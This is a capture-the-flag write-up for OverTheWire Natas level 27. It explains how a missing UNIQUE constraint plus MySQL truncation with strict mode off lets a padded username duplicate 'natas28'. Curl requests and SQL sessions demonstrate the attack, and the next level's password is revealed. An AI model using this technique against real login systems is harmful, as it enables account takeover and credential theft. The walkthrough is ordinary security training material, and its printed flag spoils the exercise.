# Level 27

## What does the main page look like?

```php
$ curl -s --user natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ http://natas27.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Source code

```php
$ curl -s --user natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ http://natas27.natas.labs.overthewire.org/index-source.html | html2text 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "<censored>" };</
script></head>
<body>
<h1>natas27</h1>
<div id="content">
<?

// morla / 10111
// database gets cleared every 5 min 


/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/


function checkCredentials($link,$usr,$pass){
 
    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);
    
    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0){
        return True;
    }
    return False;
}


function validUser($link,$usr){
    
    $user=mysql_real_escape_string($usr);
    
    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}


function dumpData($link,$usr){
    
    $user=mysql_real_escape_string($usr);
    
    $query = "SELECT * from users where username='$user'";
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            while ($row = mysql_fetch_assoc($res)) {
                // thanks to Gobo for reporting this bug!  
                //return print_r($row);
                return print_r($row,true);
            }
        }
    }
    return False;
}


function createUser($link, $usr, $pass){

    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);
    
    $query = "INSERT INTO users (username,password) values 
('$user','$password')";
    $res = mysql_query($query, $link);
    if(mysql_affected_rows() > 0){
        return True;
    }
    return False;
}


if(array_key_exists("username", $_REQUEST) and array_key_exists
("password", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas27', '<censored>');
    mysql_select_db('natas27', $link);
   

    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"]))
{
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST
["username"]) . "<br>";
        }        
    } 
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){ 
            echo "User " . htmlentities($_REQUEST
["username"]) . " was created!";
        }
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<? } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Analysis and Proof of Concept (on our own machine)

### MySQL table

#### No UNIQUE constraint

The source code reveals that the `users` table has 2 fields of `VARCHAR(64)` with no constraint. It is interesting because it means we could create duplicated usernames. The constraint however is implemented in the PHP code:

```php
if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])) {
	// If the user exists and the provided password is correct
	echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
	echo "Here is your data:<br>";
	$data=dumpData($link,$_REQUEST["username"]);
	print htmlentities($data);
} else {
	// If the username exists but the provided password is incorrect
	echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
}        
```

In MySQL, with no constraint, it is possible to create 2 usernames with same names, one of which with a trailing space. Notice that the below request will list both entries, even with the condition `WHERE username='natas28'`:

~~~
MariaDB [test]> SELECT username, password, length(username) FROM users WHERE username='natas28';
+----------+----------+------------------+
| username | password | length(username) |
+----------+----------+------------------+
| natas28  | s3cR37   |                7 |
| natas28  | pass     |                8 |
+----------+----------+------------------+
2 rows in set (0.000 sec)
~~~

This wouldn't have been possible if the table would have a UNIQUE constraint:

~~~
MariaDB [test]> CREATE TABLE users(username VARCHAR(64) UNIQUE, password VARCHAR(64));
Query OK, 0 rows affected (0.047 sec)

MariaDB [test]> insert into users(username, password) values('natas28', 's3cR37');
Query OK, 1 row affected (0.006 sec)

MariaDB [test]> insert into users(username, password) values('natas28 ', 'natas28*');
ERROR 1062 (23000): Duplicate entry 'natas28 ' for key 'username'
~~~

#### Overflow and strict SQL mode

There is something interesting about `VARCHAR()` overflow when the SQL strict mode is disabled (enabled by default).

> *"If strict SQL mode is not enabled and you assign a value to a CHAR or VARCHAR column that exceeds the column's maximum length, the value is truncated to fit and a warning is generated. For truncation of nonspace characters, you can cause an error to occur (rather than a warning) and suppress insertion of the value by using strict SQL mode." (Source: https://dev.mysql.com/doc/refman/5.7/en/char.html)*

Let's test on our own machine. To check if strict mode is enabled:

~~~
mysql> SHOW VARIABLES LIKE 'sql_mode';
+---------------+-------------------------------------------------------------------------------------------------------------------------------------------+
| Variable_name | Value                                                                                                                                     |
+---------------+-------------------------------------------------------------------------------------------------------------------------------------------+
| sql_mode      | ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |
+---------------+-------------------------------------------------------------------------------------------------------------------------------------------+
~~~

It is enabled (`STRICT_TRANS_TABLES`). Let's disable it and quit (you have to quit and reconnect).

~~~
mysql> set global sql_mode='';
Query OK, 0 rows affected, 1 warning (0.00 sec)

mysql> \q
~~~

Strict mode is now disabled:

~~~
mysql> SHOW VARIABLES LIKE 'sql_mode';
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| sql_mode      |       |
+---------------+-------+
~~~


Now let's test what happens when we overflow the username field (`VARCHAR(10)` in our example):

~~~
mysql> CREATE TABLE users(username VARCHAR(10), password VARCHAR(64));
Query OK, 0 rows affected (0.01 sec)

mysql> INSERT INTO users(username, password) VALUES ('natas28   n', 'natas28');
Query OK, 1 row affected, 1 warning (0.00 sec)

mysql> select * from users where username='natas28';
+------------+----------+
| username   | password |
+------------+----------+
| natas28    | natas28  |
+------------+----------+
1 row in set (0.01 sec)
~~~

Our `INSERT` statement was trying to overflow the maximum length of 10 characters, and MySQL has truncated the provided username.

### Proof of Concept

Now that we have made all these tests, let's make a proof of concept. Let's create a first user with a secret password. This will be the password we need to find.

~~~
mysql> truncate table users;
Query OK, 0 rows affected (0.02 sec)

mysql> insert into users(username, password) values('natas28', 's3cR37');
Query OK, 1 row affected (0.00 sec)
~~~

Now, let's simulate the actions we will do to solve the challenge. We'll first create another `natas28` username (using overflow) and a password that we know. This is what will be done by the `createUser()` function.

~~~
mysql> insert into users(username, password) values('natas28   Z', 'natas28');
Query OK, 1 row affected, 1 warning (0.00 sec)
~~~

Now, we'll log in. A call to `checkCredentials()` will be made, let's simulate it:

~~~
mysql> select username from users where username='natas28' and password='natas28';
+------------+
| username   |
+------------+
| natas28    |
+------------+
1 row in set (0.00 sec)
~~~

That worked, 1 entry has been returned. The PHP code will then call `dumpData()` and will list all `natas28` users:

~~~
mysql> select * from users where username='natas28';
+------------+----------+
| username   | password |
+------------+----------+
| natas28    | s3cR37   |
| natas28    | natas28  |
+------------+----------+
2 rows in set (0.00 sec)
~~~

## Exploit

We can confirm that the `natas28` user exists in the table (but we don't know the password):
```php
$ curl -s -d "username=natas28&password=natas28" -X POST --user natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ http://natas27.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
Wrong password for user: natas28<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Now, let's create `natas28` (with 57 spaces and a trailing `Z` for the overflow):

```php
$ echo "natas28$(printf '%*s' 57)Z"
natas28                                                         Z
$ curl -s -d "username=natas28                                                         Z&password=natas28" -X POST --user natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ http://natas27.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
User natas28                                                         Z was created!<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

And now log in with `natas28` (without trailing space) with the password we have created before:

```php
$ curl -s -d "username=natas28&password=natas28" -X POST --user natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ http://natas27.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas27", "pass": "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ" };</script></head>
<body>
<h1>natas27</h1>
<div id="content">
Welcome natas28!<br>Here is your data:<br>Array
(
    [username] =&gt; natas28
    [password] =&gt; JWwR438wkgTsNKBbcJoowyysdM82YjeF
)
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

# Flag
~~~
natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF
~~~